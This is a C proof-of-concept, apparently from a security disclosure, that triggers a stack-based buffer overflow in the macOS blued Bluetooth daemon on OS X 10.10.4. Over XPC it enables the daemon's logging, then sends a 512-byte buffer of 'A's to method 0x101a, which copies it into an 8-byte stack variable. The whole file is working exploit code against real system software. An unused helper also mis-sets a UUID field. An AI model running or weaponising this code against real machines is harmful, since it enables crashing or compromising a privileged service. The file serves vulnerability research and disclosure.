/*
   Stack-based buffer overflow in blued, for OS X 10.10.4
   Authors: @rpaleari and @joystick

   This PoC triggers a stack-based buffer overflow in blued. The overflow
   affects method with selector 0x101a (method #26). The service performs a
   bcopy(src, dst, len), where "src" is an attacker-controlled input buffer,
   "len" is its length, and "dst" is a 8-byte, stack-allocated variable.

   Compile with:
     clang -o xpc_blued_overflow1{,.c} -framework CoreFoundation
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

#include <uuid/uuid.h>
#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>

#define CLIENT_NAME "myclient"

void send_single_message(xpc_connection_t conn, xpc_object_t msg) {
  __block bool b_sent = false;

  xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t event) {
      char *desc = xpc_copy_description(event);
      printf("Reply: %s\n", desc);
      free(desc);
    });

  xpc_connection_send_barrier(conn, ^{
      printf("Message sent!\n");
      b_sent = true;
    });


  while(!b_sent) {
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0, TRUE);
  }
}

void blued_enable_logging(xpc_connection_t conn) {
  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
  xpc_object_t args = xpc_array_create(NULL, 0);

  xpc_array_append_value(args, xpc_bool_create(true));

  xpc_dictionary_set_uint64(msg, "method", 0x1000 + 42);
  xpc_dictionary_set_value(msg, "arguments", args);

  printf("Enabling logging\n");
  send_single_message(conn, msg);

  xpc_release(msg);
  xpc_release(args);
}

void blued_core_add_client(xpc_connection_t conn, char *name) {
  uuid_t uuid;
  uuid_generate(uuid);

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
  xpc_object_t args = xpc_dictionary_create(NULL, NULL, 0);

  xpc_dictionary_set_string(args, "kCBMsgArgName", name);

  xpc_dictionary_set_int64(msg, "kCBMsgId", 1);
  xpc_dictionary_set_uuid(msg,  "kCBMsgArgDeviceUUID", args);
  xpc_dictionary_set_value(msg, "kCBMsgArgs", args);

  printf("Adding client '%s'\n", name);
  send_single_message(conn, msg);

  xpc_release(msg);
  xpc_release(args);
}

int main(){
  xpc_connection_t conn =
    xpc_connection_create_mach_service("com.apple.blued", NULL, 0);
  assert(conn);

  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
      printf("Message received from connection:\n");
      char *desc = xpc_copy_description(event);
      printf("Reply: %s\n", desc);
      free(desc);
    });

  xpc_connection_resume(conn);

  /* Enable logging to /var/log/blued.log */
  blued_enable_logging(conn);

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
  xpc_object_t args = xpc_array_create(NULL, 0);

  char buffer[512];
  memset(buffer, 'A', sizeof(buffer));
  xpc_array_append_value(args, xpc_data_create(buffer, sizeof(buffer)));

  xpc_dictionary_set_uint64(msg, "method", 0x1000 + 26);
  xpc_dictionary_set_value(msg, "arguments", args);

  send_single_message(conn, msg);

  xpc_release(msg);
  xpc_release(args);

  return 0;
}
